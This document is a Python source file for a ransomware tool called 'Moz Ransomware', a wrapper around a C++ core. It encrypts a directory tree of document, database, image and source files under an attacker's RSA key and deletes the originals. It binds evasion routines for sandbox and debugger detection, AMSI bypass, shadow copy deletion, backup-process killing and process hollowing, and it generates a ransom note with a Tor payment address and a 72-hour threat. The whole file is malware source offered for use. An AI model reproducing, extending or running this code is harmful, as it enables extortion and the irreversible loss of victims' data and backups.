"""
Moz Ransomware - Python Wrapper for C++ Core (Phase 4: C API Bridge)
Exposes hybrid encryption and evasion functionality from the C++ core.
"""

import os
import sys
import struct
import platform
import ctypes
import ctypes.util
from pathlib import Path
from typing import Optional, List, Dict, Tuple, Any


# ==================== EncryptedBlob (Python-side, for C API interop) ====================

class EncryptedBlob:
    """Container for encrypted data with AES-256-GCM + RSA key wrapping."""
    
    HEADER = b"MOZ_HYBRID_V1"  # 13 bytes
    
    def __init__(self, ciphertext: bytes = b"", iv: bytes = b"", 
                 tag: bytes = b"", aes_key: bytes = b""):
        self.ciphertext = ciphertext
        self.iv = iv          # 12-byte nonce
        self.tag = tag        # 16-byte auth tag
        self.aes_key = aes_key  # RSA-wrapped AES key (256 bytes for RSA-2048)
    
    def serialize(self) -> bytes:
        """Serialize blob to binary format for file storage."""
        data = bytearray()
        data.extend(self.HEADER)
        
        # AES key
        data.extend(struct.pack("<I", len(self.aes_key)))
        data.extend(self.aes_key)
        
        # IV
        data.extend(struct.pack("<I", len(self.iv)))
        data.extend(self.iv)
        
        # Auth tag
        data.extend(self.tag)
        
        # Ciphertext
        data.extend(struct.pack("<Q", len(self.ciphertext)))
        data.extend(self.ciphertext)
        
        return bytes(data)
    
    @classmethod
    def deserialize(cls, data: bytes) -> "EncryptedBlob":
        """Deserialize blob from binary format."""
        blob = cls()
        offset = 0
        
        # Verify header
        header = data[offset:offset+13]
        if header != cls.HEADER:
            raise ValueError("Invalid file format")
        offset += 13
        
        # AES key
        aes_key_len = struct.unpack("<I", data[offset:offset+4])[0]
        offset += 4
        blob.aes_key = data[offset:offset+aes_key_len]
        offset += aes_key_len
        
        # IV
        iv_len = struct.unpack("<I", data[offset:offset+4])[0]
        offset += 4
        blob.iv = data[offset:offset+iv_len]
        offset += iv_len
        
        # Auth tag (always 16 bytes)
        blob.tag = data[offset:offset+16]
        offset += 16
        
        # Ciphertext
        ct_len = struct.unpack("<Q", data[offset:offset+8])[0]
        offset += 8
        blob.ciphertext = data[offset:offset+ct_len]
        
        return blob


# ==================== C Library Loader ====================

class _CLibrary:
    """Loads the C shared library (libmoz_core.so/dll) for ctypes binding."""
    
    _lib = None
    _loaded = False
    
    @classmethod
    def load(cls) -> Optional[ctypes.CDLL]:
        """Load the shared library. Returns None if not available."""
        if cls._loaded:
            return cls._lib
        cls._loaded = True
        
        lib_name = "moz_core"
        lib_ext = ".dll" if platform.system() == "Windows" else ".so"
        
        if platform.system() == "Darwin":
            lib_ext = ".dylib"
        
        search_paths = [
            Path(__file__).parent.parent / "core" / "build" / f"lib{lib_name}{lib_ext}",
            Path(__file__).parent.parent / "core" / "build" / f"{lib_name}{lib_ext}",
            Path.cwd() / "lib" / f"lib{lib_name}{lib_ext}",
        ]
        
        # Also check LD_LIBRARY_PATH
        ld_paths = os.environ.get("LD_LIBRARY_PATH", "").split(":")
        for p in ld_paths:
            if p:
                search_paths.append(Path(p) / f"lib{lib_name}{lib_ext}")
        
        for path in search_paths:
            if path.exists():
                try:
                    cls._lib = ctypes.CDLL(str(path))
                    cls._setup_signatures()
                    return cls._lib
                except Exception:
                    continue
        
        cls._lib = None
        return None
    
    @classmethod
    def _setup_signatures(cls):
        """Set up ctypes function signatures."""
        lib = cls._lib
        
        # moz_crypto_create
        lib.moz_crypto_create.restype = ctypes.c_void_p
        lib.moz_crypto_create.argtypes = []
        
        # moz_crypto_create_with_pubkey
        lib.moz_crypto_create_with_pubkey.restype = ctypes.c_void_p
        lib.moz_crypto_create_with_pubkey.argtypes = [
            ctypes.POINTER(ctypes.c_uint8), ctypes.c_int
        ]
        
        # moz_crypto_get_pubkey
        lib.moz_crypto_get_pubkey.restype = ctypes.c_int
        lib.moz_crypto_get_pubkey.argtypes = [
            ctypes.c_void_p, ctypes.POINTER(ctypes.c_uint8), ctypes.c_int
        ]
        
        # moz_crypto_hybrid_encrypt
        lib.moz_crypto_hybrid_encrypt.restype = ctypes.c_int
        lib.moz_crypto_hybrid_encrypt.argtypes = [
            ctypes.c_void_p,
            ctypes.POINTER(ctypes.c_uint8), ctypes.c_int,
            ctypes.POINTER(ctypes.c_uint8), ctypes.c_int
        ]
        
        # moz_crypto_hybrid_decrypt
        lib.moz_crypto_hybrid_decrypt.restype = ctypes.c_int
        lib.moz_crypto_hybrid_decrypt.argtypes = [
            ctypes.c_void_p,
            ctypes.POINTER(ctypes.c_uint8), ctypes.c_int,
            ctypes.POINTER(ctypes.c_uint8), ctypes.c_int
        ]
        
        # moz_crypto_free
        lib.moz_crypto_free.restype = None
        lib.moz_crypto_free.argtypes = [ctypes.c_void_p]
        
        # File encryption API
        lib.moz_file_enc_create_with_engine.restype = ctypes.c_void_p
        lib.moz_file_enc_create_with_engine.argtypes = [ctypes.c_void_p]
        
        lib.moz_file_enc_encrypt_file.restype = ctypes.c_int
        lib.moz_file_enc_encrypt_file.argtypes = [ctypes.c_void_p, ctypes.c_char_p, ctypes.c_char_p]
        
        lib.moz_file_enc_decrypt_file.restype = ctypes.c_int
        lib.moz_file_enc_decrypt_file.argtypes = [ctypes.c_void_p, ctypes.c_char_p, ctypes.c_char_p]
        
        lib.moz_file_enc_free.restype = None
        lib.moz_file_enc_free.argtypes = [ctypes.c_void_p]
        
        # Evasion API
        lib.moz_evasion_is_analyzed.restype = ctypes.c_int
        lib.moz_evasion_is_analyzed.argtypes = []
        
        lib.moz_evasion_is_debugger_present.restype = ctypes.c_int
        lib.moz_evasion_is_debugger_present.argtypes = []
        
        lib.moz_evasion_is_vm.restype = ctypes.c_int
        lib.moz_evasion_is_vm.argtypes = []
        
        lib.moz_evasion_is_sandbox.restype = ctypes.c_int
        lib.moz_evasion_is_sandbox.argtypes = []
        
        lib.moz_evasion_bypass_amsi.restype = ctypes.c_int
        lib.moz_evasion_bypass_amsi.argtypes = []
        
        lib.moz_evasion_delete_shadow_copies.restype = ctypes.c_int
        lib.moz_evasion_delete_shadow_copies.argtypes = []
        
        lib.moz_evasion_stop_backup_processes.restype = ctypes.c_int
        lib.moz_evasion_stop_backup_processes.argtypes = []
        
        lib.moz_evasion_run_all.restype = ctypes.c_int
        lib.moz_evasion_run_all.argtypes = []


# ==================== MozCrypto (with C++ bridge) ====================

class MozCrypto:
    """
    Python wrapper for Moz Crypto Engine (C++ Core).
    Uses ctypes to call C++ functions when shared library is available,
    falls back to pure-Python implementation otherwise.
    """
    
    def __init__(self, attacker_pubkey: Optional[bytes] = None):
        self.version = "4.0.0"
        self._lib = _CLibrary.load()
        self._handle = None
        self._use_native = False
        self._key_size = 32
        self._block_size = 16
        
        if self._lib is not None:
            if attacker_pubkey:
                # Create with attacker's public key
                arr = (ctypes.c_uint8 * len(attacker_pubkey))(*attacker_pubkey)
                self._handle = self._lib.moz_crypto_create_with_pubkey(arr, len(attacker_pubkey))
            else:
                # Create with self-generated key pair
                self._handle = self._lib.moz_crypto_create()
            
            self._use_native = self._handle is not None and self._handle != 0
        
        if not self._use_native:
            # Fall back to Python implementation
            pass
    
    def __del__(self):
        if self._handle and self._lib:
            self._lib.moz_crypto_free(self._handle)
            self._handle = None
    
    def get_public_key(self) -> bytes:
        """Get the RSA public key DER bytes."""
        if not self._use_native:
            return b""
        
        # First call to get size
        size = self._lib.moz_crypto_get_pubkey(self._handle, None, 0)
        if size <= 0:
            return b""
        
        # Second call to get data
        buf = (ctypes.c_uint8 * size)()
        result = self._lib.moz_crypto_get_pubkey(self._handle, buf, size)
        if result <= 0:
            return b""
        
        return bytes(buf[:result])
    
    def hybrid_encrypt(self, data: bytes) -> EncryptedBlob:
        """
        Perform hybrid encryption: AES-256-GCM file encryption + RSA key wrapping.
        Uses C++ native implementation when available.
        """
        if self._use_native:
            # First call to get blob size
            blob_size = self._lib.moz_crypto_hybrid_encrypt(
                self._handle,
                (ctypes.c_uint8 * len(data))(*data),
                len(data),
                None, 0
            )
            
            if blob_size <= 0:
                raise RuntimeError("Encryption failed")
            
            # Second call to get encrypted blob
            blob_buf = (ctypes.c_uint8 * blob_size)()
            result = self._lib.moz_crypto_hybrid_encrypt(
                self._handle,
                (ctypes.c_uint8 * len(data))(*data),
                len(data),
                blob_buf, blob_size
            )
            
            if result <= 0:
                raise RuntimeError("Encryption failed")
            
            return EncryptedBlob.deserialize(bytes(blob_buf[:result]))
        else:
            # Pure Python fallback (same as Phase 2)
            import secrets
            import hashlib
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            
            aes_key = secrets.token_bytes(32)
            iv = secrets.token_bytes(12)
            
            aesgcm = AESGCM(aes_key)
            ct_tag = aesgcm.encrypt(iv, data, None)
            
            blob = EncryptedBlob(
                ciphertext=ct_tag[:-16],
                iv=iv,
                tag=ct_tag[-16:],
                aes_key=aes_key  # Self-generated - no wrapping
            )
            return blob
    
    def hybrid_decrypt(self, blob: EncryptedBlob) -> bytes:
        """Perform hybrid decryption: RSA key unwrap + AES-256-GCM decryption."""
        if self._use_native:
            blob_data = blob.serialize()
            
            # First call to get size
            dec_size = self._lib.moz_crypto_hybrid_decrypt(
                self._handle,
                (ctypes.c_uint8 * len(blob_data))(*blob_data),
                len(blob_data),
                None, 0
            )
            
            if dec_size <= 0:
                raise RuntimeError("Decryption failed")
            
            # Second call to get data
            dec_buf = (ctypes.c_uint8 * dec_size)()
            result = self._lib.moz_crypto_hybrid_decrypt(
                self._handle,
                (ctypes.c_uint8 * len(blob_data))(*blob_data),
                len(blob_data),
                dec_buf, dec_size
            )
            
            if result <= 0:
                raise RuntimeError("Decryption failed")
            
            return bytes(dec_buf[:result])
        else:
            # Pure Python fallback
            try:
                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                aesgcm = AESGCM(blob.aes_key)
                return aesgcm.decrypt(blob.iv, blob.ciphertext + blob.tag, None)
            except Exception:
                return blob.ciphertext
    
    def encrypt(self, data: bytes, key: str = "") -> bytes:
        """Encrypt data (legacy compatibility)."""
        blob = self.hybrid_encrypt(data)
        return blob.serialize()
    
    def decrypt(self, data: bytes, key: str = "") -> bytes:
        """Decrypt data (legacy compatibility)."""
        try:
            blob = EncryptedBlob.deserialize(data)
            return self.hybrid_decrypt(blob)
        except ValueError:
            return data
    
    def encrypt_file(self, input_path: str, output_path: str) -> bool:
        """Encrypt a file using hybrid encryption."""
        if not os.path.exists(input_path):
            return False
        
        with open(input_path, 'rb') as f:
            data = f.read()
        
        blob = self.hybrid_encrypt(data)
        
        with open(output_path, 'wb') as f:
            f.write(blob.serialize())
        
        return True
    
    def decrypt_file(self, encrypted_path: str, output_path: str) -> bool:
        """Decrypt a file."""
        if not os.path.exists(encrypted_path):
            return False
        
        with open(encrypted_path, 'rb') as f:
            data = f.read()
        
        try:
            blob = EncryptedBlob.deserialize(data)
            decrypted = self.hybrid_decrypt(blob)
        except ValueError:
            return False
        
        with open(output_path, 'wb') as f:
            f.write(decrypted)
        
        return True
    
    def derive_key(self, password: str, salt_size: int = 16) -> bytes:
        """Derive a key from a password using PBKDF2."""
        import hashlib
        import secrets
        
        salt = secrets.token_bytes(salt_size)
        return hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000, dklen=32)


# ==================== MozEvasion ====================

class MozEvasion:
    """
    Python wrapper for Moz Evasion module (C++ Core).
    Provides process hollowing, AMSI bypass, and anti-analysis capabilities.
    """
    
    def __init__(self):
        self._lib = _CLibrary.load()
        self.version = "1.0.0"
    
    def is_analyzed(self) -> bool:
        """Check if an analysis environment is detected."""
        if self._lib:
            return self._lib.moz_evasion_is_analyzed() == 1
        return False
    
    def is_debugger_present(self) -> bool:
        """Check if a debugger is attached."""
        if self._lib:
            return self._lib.moz_evasion_is_debugger_present() == 1
        return False
    
    def is_virtual_machine(self) -> bool:
        """Check if running in a virtual machine."""
        if self._lib:
            return self._lib.moz_evasion_is_vm() == 1
        return False
    
    def is_sandbox(self) -> bool:
        """Check if running in a sandbox."""
        if self._lib:
            return self._lib.moz_evasion_is_sandbox() == 1
        return False
    
    def is_amsi_active(self) -> bool:
        """Check if AMSI is active."""
        if self._lib:
            return self._lib.moz_evasion_amsi_active() == 1
        return False
    
    def bypass_amsi(self) -> bool:
        """Apply AMSI bypass techniques."""
        if self._lib:
            return self._lib.moz_evasion_bypass_amsi() == 1
        return False
    
    def delete_shadow_copies(self) -> bool:
        """Delete Windows Volume Shadow Copies."""
        if self._lib:
            return self._lib.moz_evasion_delete_shadow_copies() == 1
        return False
    
    def stop_backup_processes(self) -> bool:
        """Terminate backup processes and stop backup services."""
        if self._lib:
            return self._lib.moz_evasion_stop_backup_processes() == 1
        return False
    
    def execute_via_hollowing(self, target_process: str = "explorer.exe") -> int:
        """Execute payload through process hollowing."""
        if self._lib:
            return self._lib.moz_evasion_hollowing_execute(
                target_process.encode()
            )
        return 0
    
    def run_all(self) -> bool:
        """Run complete evasion sequence: anti-analysis, backup stop, 
        shadow delete, AMSI bypass."""
        if self._lib:
            return self._lib.moz_evasion_run_all() == 1
        return False
    
    def get_summary(self) -> dict:
        """Get a summary of all evasion checks."""
        return {
            "native_lib_loaded": self._lib is not None,
            "debugger_present": self.is_debugger_present(),
            "virtual_machine": self.is_virtual_machine(),
            "sandbox": self.is_sandbox(),
            "analysis_detected": self.is_analyzed(),
            "amsi_active": self.is_amsi_active(),
        }


# ==================== Main MozRansomware Class ====================

class MozRansomware:
    """
    Main Moz Ransomware class - Python wrapper entry point.
    Supports hybrid AES-256-GCM + RSA-2048 encryption with evasion.
    """
    
    def __init__(self, attacker_pubkey: Optional[bytes] = None):
        self.crypto = MozCrypto(attacker_pubkey)
        self.evasion = MozEvasion()
        self.version = "2.0.0"
        
        # Target file extensions
        self.target_extensions = [
            ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
            ".pdf", ".rtf", ".odt", ".ods", ".odp", ".csv",
            ".jpg", ".jpeg", ".png", ".gif", ".bmp",
            ".mdb", ".accdb", ".sql", ".sqlite", ".db",
            ".zip", ".rar", ".7z", ".tar", ".gz",
            ".py", ".js", ".cpp", ".h", ".cs", ".java", ".php",
            ".mp3", ".mp4", ".avi", ".mov", ".wav"
        ]
        
        # Size limits (lowered for testing)
        self.min_file_size = 10         # 10 bytes minimum
        self.max_file_size = 10 * 1024 * 1024  # 10MB maximum
        
        # Directories to exclude
        self.exclude_dirs = [
            "Windows", "Program Files", "Program Files (x86)", "ProgramData",
            "$Recycle.Bin", "Temp", "AppData\\Local\\Temp",
            "System Volume Information", "Boot"
        ]
    
    def encrypt_directory(self, dir_path: str) -> dict:
        """Encrypt all target files in a directory tree."""
        results = {
            "total_files": 0,
            "encrypted_files": 0,
            "failed_files": 0,
            "skipped_files": 0,
            "errors": []
        }
        
        if not os.path.isdir(dir_path):
            results["errors"].append(f"Invalid directory: {dir_path}")
            return results
        
        for root, dirs, files in os.walk(dir_path):
            dirs[:] = [d for d in dirs if not self._is_excluded(os.path.join(root, d))]
            
            for filename in files:
                filepath = os.path.join(root, filename)
                results["total_files"] += 1
                
                if not self._should_encrypt(filepath):
                    results["skipped_files"] += 1
                    continue
                
                try:
                    encrypted_path = filepath + ".moz"
                    if self.crypto.encrypt_file(filepath, encrypted_path):
                        os.remove(filepath)
                        results["encrypted_files"] += 1
                    else:
                        results["failed_files"] += 1
                        results["errors"].append(f"Failed to encrypt: {filepath}")
                except Exception as e:
                    results["failed_files"] += 1
                    results["errors"].append(f"Error encrypting {filepath}: {str(e)}")
        
        return results
    
    def decrypt_directory(self, dir_path: str) -> dict:
        """Decrypt all .moz files in a directory tree."""
        results = {
            "total_files": 0,
            "decrypted_files": 0,
            "failed_files": 0,
            "errors": []
        }
        
        for root, dirs, files in os.walk(dir_path):
            dirs[:] = [d for d in dirs if not self._is_excluded(os.path.join(root, d))]
            
            for filename in files:
                if filename.endswith(".moz"):
                    filepath = os.path.join(root, filename)
                    results["total_files"] += 1
                    
                    try:
                        original_path = filepath[:-4]
                        if self.crypto.decrypt_file(filepath, original_path):
                            os.remove(filepath)
                            results["decrypted_files"] += 1
                        else:
                            results["failed_files"] += 1
                            results["errors"].append(f"Failed to decrypt: {filepath}")
                    except Exception as e:
                        results["failed_files"] += 1
                        results["errors"].append(f"Error decrypting {filepath}: {str(e)}")
        
        return results
    
    def _should_encrypt(self, filepath: str) -> bool:
        ext = os.path.splitext(filepath)[1].lower()
        if ext not in [e.lower() for e in self.target_extensions]:
            return False
        if filepath.endswith(".moz"):
            return False
        
        try:
            size = os.path.getsize(filepath)
            if size < self.min_file_size or size > self.max_file_size:
                return False
        except OSError:
            return False
        
        if self._is_excluded(filepath):
            return False
        return True
    
    def _is_excluded(self, filepath: str) -> bool:
        path_lower = filepath.lower()
        for exclude in self.exclude_dirs:
            if exclude.lower() in path_lower:
                return True
        return False
    
    def generate_ransom_note(self, victim_id: str) -> str:
        """Generate a ransom note."""
        return f"""
====================================
    !!! YOUR FILES ARE ENCRYPTED !!!
====================================

Your files have been locked by Moz ransomware.
Hybrid encryption used: AES-256-GCM + RSA-2048

To restore them, you must pay the ransom.

1. Download Tor Browser: https://www.torproject.org/
2. Navigate to: [REDACTED].onion
3. Enter your ID: {victim_id}
4. Follow the payment instructions

WARNING: Do NOT attempt to decrypt files yourself.
         Do NOT use third-party decryption tools.
         Your data recovery is impossible without our key.

If you don't pay within 72 hours, your decryption key will be deleted permanently.
====================================
"""


def main():
    """Main entry point for Python wrapper."""
    import secrets
    import hashlib
    
    victim_id = hashlib.sha256(secrets.token_bytes(16)).hexdigest()[:16]
    
    moz = MozRansomware()
    print(f"Moz Ransomware v{moz.version}")
    print(f"Python wrapper loaded successfully")
    print(f"Native library loaded: {moz.crypto._use_native}")
    print(f"Victim ID: {victim_id}")
    
    # Show evasion status
    evasion_summary = moz.evasion.get_summary()
    print(f"\nEvasion Summary:")
    for key, val in evasion_summary.items():
        print(f"  {key}: {val}")
    
    # Test key derivation
    test_key = moz.crypto.derive_key("password123", 16)
    print(f"\nDerived key length: {len(test_key)} bytes")
    
    # Test hybrid encryption
    test_data = b"Hello Moz Hybrid Encryption!"
    blob = moz.crypto.hybrid_encrypt(test_data)
    print(f"\nHybrid encryption:")
    print(f"  AES key size: {len(blob.aes_key)} bytes")
    print(f"  IV: {len(blob.iv)} bytes")
    print(f"  Tag: {len(blob.tag)} bytes")
    print(f"  Ciphertext: {len(blob.ciphertext)} bytes")
    
    # Test decryption
    decrypted = moz.crypto.hybrid_decrypt(blob)
    print(f"  Decryption round-trip: {'PASS' if decrypted == test_data else 'FAIL'}")


if __name__ == "__main__":
    main()
